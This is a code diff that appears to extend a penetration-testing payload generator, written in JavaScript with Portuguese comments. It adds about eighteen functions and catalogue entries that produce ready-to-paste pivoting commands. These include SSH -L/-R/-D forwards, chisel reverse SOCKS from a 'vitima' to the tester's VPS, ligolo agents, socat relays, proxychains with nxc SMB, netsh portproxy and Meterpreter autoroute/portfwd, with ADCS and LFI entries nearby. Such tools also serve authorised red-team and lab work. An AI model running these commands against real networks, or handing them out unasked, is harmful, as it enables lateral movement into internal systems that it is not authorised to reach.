@@ -696,6 +696,79 @@ function adCertipyFind(user, dc) {
   return "certipy find -u '" + user + "@LAB.local' -p 'PASS' -dc-ip " + dc + " -stdout  # ESC1-8 ADCS";
 }
 
+// --- Pivoting / tuneis ---
+function pivSshL(pivot, target) {
+  return "ssh -L 8080:" + target + ":80 usuario@" + pivot + "  # acesse 127.0.0.1:8080";
+}
+
+function pivSshR(ip) {
+  return "ssh -R 8080:127.0.0.1:80 usuario@" + ip + " -N -f  # vitima -> seu listener ssh";
+}
+
+function pivSshD(pivot) {
+  return "ssh -D 1080 -C -q -N usuario@" + pivot + "  # SOCKS5 127.0.0.1:1080 + proxychains";
+}
+
+function pivSshJ(pivot, target) {
+  return "ssh -J usuario@" + pivot + " usuario@" + target;
+}
+
+function pivSshuttle(pivot, net) {
+  return "sshuttle -r usuario@" + pivot + " " + net + "  # VPN over SSH p/ rede interna";
+}
+
+function pivChiselServer(port) {
+  return "chisel server -p " + port + " --reverse  # no seu VPS/lab";
+}
+
+function pivChiselSocks(ip, port) {
+  return "chisel client " + ip + ":" + port + " R:socks  # SOCKS 127.0.0.1:1080 na sua maquina";
+}
+
+function pivChiselRemote(ip, port, target) {
+  return "chisel client " + ip + ":" + port + " R:8080:" + target + ":80";
+}
+
+function pivChiselLocal(pivot, port, target) {
+  return "chisel client " + pivot + ":" + port + " 8080:" + target + ":80  # forward local via pivot";
+}
+
+function pivLigoloProxy() {
+  return "./proxy -selfcert  # + ip tuntap add mode tun dev ligolo && ip link set ligolo up";
+}
+
+function pivLigoloAgent(ip, port) {
+  return "./agent -connect " + ip + ":" + port + " -ignore-cert  # na maquina pivot";
+}
+
+function pivLigoloRoute(net) {
+  return "ip route add " + net + " dev ligolo  # sessao: session + start";
+}
+
+function pivSocatRelay(port, target) {
+  return "socat TCP-LISTEN:" + port + ",reuseaddr,fork TCP:" + target + ":80";
+}
+
+function pivProxychains() {
+  return "echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf\nproxychains nxc smb REDE -u user -p 'PASS'";
+}
+
+function pivPlinkL(pivot, target) {
+  return "plink -ssh -L 8080:" + target + ":80 usuario@" + pivot + "  # pivot Windows";
+}
+
+function pivNetshProxy(port, target) {
+  return "netsh interface portproxy add v4tov4 listenport=" + port + " listenaddress=0.0.0.0 connectport=80 connectaddress=" + target + "  # + netsh interface portproxy show all";
+}
+
+function pivMsfAutoroute(net) {
+  return "run autoroute -s " + net + "  # sessao meterpreter -> rota";
+}
+
+function pivMsfPortfwd(port, target) {
+  return "portfwd add -l " + port + " -p 80 -r " + target + "  # sessao meterpreter";
+}
+
 function b64encode(s) {
   try { return Qt.btoa(unescape(encodeURIComponent(s))); }
   catch (e) { return ""; }
@@ -2980,6 +3053,258 @@ function getAllPayloads(ip, port, file, domain, user, dc, pivnet, pivhost) {
       code: adCertipyFind(user, dc),
       showUrl: false,
       keywords: "ad certipy adcs esc certificate pki template"
+    },
+    {
+      id: "piv-ssh-l",
+      title: "Pivot - SSH local forward -L",
+      category: "pivot",
+      categoryLabel: "Pivot",
+      icon: "\udb81\udc69",
+      subcat: "pivot",
+      context: "Pivoting & Network Tunneling",
+      purpose: "Criar rota para redes e subredes internas",
+      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
+      code: pivSshL(ip, pivhost),
+      showUrl: false,
+      keywords: "pivot ssh forward local tunnel internal port"
+    },
+    {
+      id: "piv-ssh-r",
+      title: "Pivot - SSH remote forward -R",
+      category: "pivot",
+      categoryLabel: "Pivot",
+      icon: "\udb81\udc69",
+      subcat: "pivot",
+      context: "Pivoting & Network Tunneling",
+      purpose: "Criar rota para redes e subredes internas",
+      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
+      code: pivSshR(ip),
+      showUrl: false,
+      keywords: "pivot ssh reverse remote forward tunnel expose"
+    },
+    {
+      id: "piv-ssh-d",
+      title: "Pivot - SSH SOCKS dinamico -D",
+      category: "pivot",
+      categoryLabel: "Pivot",
+      icon: "\udb81\udc69",
+      subcat: "pivot",
+      context: "Pivoting & Network Tunneling",
+      purpose: "Criar rota para redes e subredes internas",
+      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
+      code: pivSshD(ip),
+      showUrl: false,
+      keywords: "pivot ssh socks dynamic proxy proxychains tunnel"
+    },
+    {
+      id: "piv-ssh-j",
+      title: "Pivot - SSH Jump -J",
+      category: "pivot",
+      categoryLabel: "Pivot",
+      icon: "\udb81\udc69",
+      subcat: "pivot",
+      context: "Pivoting & Network Tunneling",
+      purpose: "Criar rota para redes e subredes internas",
+      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
+      code: pivSshJ(ip, pivhost),
+      showUrl: false,
+      keywords: "pivot ssh jump bastion tunnel"
+    },
+    {
+      id: "piv-sshuttle",
+      title: "Pivot - sshuttle VPN over SSH",
+      category: "pivot",
+      categoryLabel: "Pivot",
+      icon: "\udb81\udc69",
+      subcat: "pivot",
+      context: "Pivoting & Network Tunneling",
+      purpose: "Criar rota para redes e subredes internas",
+      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
+      code: pivSshuttle(ip, pivnet),
+      showUrl: false,
+      keywords: "pivot sshuttle vpn subnet route tunnel"
+    },
+    {
+      id: "piv-chisel-server",
+      title: "Pivot - Chisel server --reverse",
+      category: "pivot",
+      categoryLabel: "Pivot",
+      icon: "\udb81\udc69",
+      subcat: "pivot",
+      context: "Pivoting & Network Tunneling",
+      purpose: "Criar rota para redes e subredes internas",
+      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
+      code: pivChiselServer(port),
+      showUrl: false,
+      keywords: "pivot chisel server reverse listener tunnel"
+    },
+    {
+      id: "piv-chisel-socks",
+      title: "Pivot - Chisel client R:socks",
+      category: "pivot",
+      categoryLabel: "Pivot",
+      icon: "\udb81\udc69",
+      subcat: "pivot",
+      context: "Pivoting & Network Tunneling",
+      purpose: "Criar rota para redes e subredes internas",
+      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
+      code: pivChiselSocks(ip, port),
+      showUrl: false,
+      keywords: "pivot chisel client socks reverse proxy tunnel"
+    },
+    {
+      id: "piv-chisel-remote",
+      title: "Pivot - Chisel remote forward",
+      category: "pivot",
+      categoryLabel: "Pivot",
+      icon: "\udb81\udc69",
+      subcat: "pivot",
+      context: "Pivoting & Network Tunneling",
+      purpose: "Criar rota para redes e subredes internas",
+      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
+      code: pivChiselRemote(ip, port, pivhost),
+      showUrl: false,
+      keywords: "pivot chisel remote forward port tunnel"
+    },
+    {
+      id: "piv-chisel-local",
+      title: "Pivot - Chisel local forward",
+      category: "pivot",
+      categoryLabel: "Pivot",
+      icon: "\udb81\udc69",
+      subcat: "pivot",
+      context: "Pivoting & Network Tunneling",
+      purpose: "Criar rota para redes e subredes internas",
+      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
+      code: pivChiselLocal(ip, port, pivhost),
+      showUrl: false,
+      keywords: "pivot chisel local forward tunnel"
+    },
+    {
+      id: "piv-ligolo-proxy",
+      title: "Pivot - Ligolo proxy + tun",
+      category: "pivot",
+      categoryLabel: "Pivot",
+      icon: "\udb81\udc69",
+      subcat: "pivot",
+      context: "Pivoting & Network Tunneling",
+      purpose: "Criar rota para redes e subredes internas",
+      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
+      code: pivLigoloProxy(),
+      showUrl: false,
+      keywords: "pivot ligolo proxy tun interface tunnel"
+    },
+    {
+      id: "piv-ligolo-agent",
+      title: "Pivot - Ligolo agent -connect",
+      category: "pivot",
+      categoryLabel: "Pivot",
+      icon: "\udb81\udc69",
+      subcat: "pivot",
+      context: "Pivoting & Network Tunneling",
+      purpose: "Criar rota para redes e subredes internas",
+      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
+      code: pivLigoloAgent(ip, port),
+      showUrl: false,
+      keywords: "pivot ligolo agent connect tunnel"
+    },
+    {
+      id: "piv-ligolo-route",
+      title: "Pivot - Ligolo rota p/ rede",
+      category: "pivot",
+      categoryLabel: "Pivot",
+      icon: "\udb81\udc69",
+      subcat: "pivot",
+      context: "Pivoting & Network Tunneling",
+      purpose: "Criar rota para redes e subredes internas",
+      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
+      code: pivLigoloRoute(pivnet),
+      showUrl: false,
+      keywords: "pivot ligolo route subnet session start"
+    },
+    {
+      id: "piv-socat-relay",
+      title: "Pivot - Socat relay TCP",
+      category: "pivot",
+      categoryLabel: "Pivot",
+      icon: "\udb81\udc69",
+      subcat: "pivot",
+      context: "Pivoting & Network Tunneling",
+      purpose: "Criar rota para redes e subredes internas",
+      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
+      code: pivSocatRelay(port, pivhost),
+      showUrl: false,
+      keywords: "pivot socat relay fork forward tcp tunnel"
+    },
+    {
+      id: "piv-proxychains",
+      title: "Pivot - Proxychains via SOCKS",
+      category: "pivot",
+      categoryLabel: "Pivot",
+      icon: "\udb81\udc69",
+      subcat: "pivot",
+      context: "Pivoting & Network Tunneling",
+      purpose: "Criar rota para redes e subredes internas",
+      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
+      code: pivProxychains(),
+      showUrl: false,
+      keywords: "pivot proxychains socks nxc scan tunnel"
+    },
+    {
+      id: "piv-plink",
+      title: "Pivot - Plink -L (pivot Win)",
+      category: "pivot",
+      categoryLabel: "Pivot",
+      icon: "\udb81\udc69",
+      subcat: "pivot",
+      context: "Pivoting & Network Tunneling",
+      purpose: "Criar rota para redes e subredes internas",
+      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
+      code: pivPlinkL(ip, pivhost),
+      showUrl: false,
+      keywords: "pivot plink putty windows ssh forward tunnel"
+    },
+    {
+      id: "piv-netsh",
+      title: "Pivot - netsh portproxy (Win)",
+      category: "pivot",
+      categoryLabel: "Pivot",
+      icon: "\udb81\udc69",
+      subcat: "pivot",
+      context: "Pivoting & Network Tunneling",
+      purpose: "Criar rota para redes e subredes internas",
+      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
+      code: pivNetshProxy(port, pivhost),
+      showUrl: false,
+      keywords: "pivot netsh portproxy windows forward tunnel"
+    },
+    {
+      id: "piv-msf-autoroute",
+      title: "Pivot - Meterpreter autoroute",
+      category: "pivot",
+      categoryLabel: "Pivot",
+      icon: "\udb81\udc69",
+      subcat: "pivot",
+      context: "Pivoting & Network Tunneling",
+      purpose: "Criar rota para redes e subredes internas",
+      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
+      code: pivMsfAutoroute(pivnet),
+      showUrl: false,
+      keywords: "pivot meterpreter autoroute route metasploit session"
+    },
+    {
+      id: "piv-msf-portfwd",
+      title: "Pivot - Meterpreter portfwd",
+      category: "pivot",
+      categoryLabel: "Pivot",
+      icon: "\udb81\udc69",
+      subcat: "pivot",
+      context: "Pivoting & Network Tunneling",
+      purpose: "Criar rota para redes e subredes internas",
+      description: "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.",
+      code: pivMsfPortfwd(port, pivhost),
+      showUrl: false,
+      keywords: "pivot meterpreter portfwd forward metasploit session"
     },
     {
       id: "lfi-traversal",
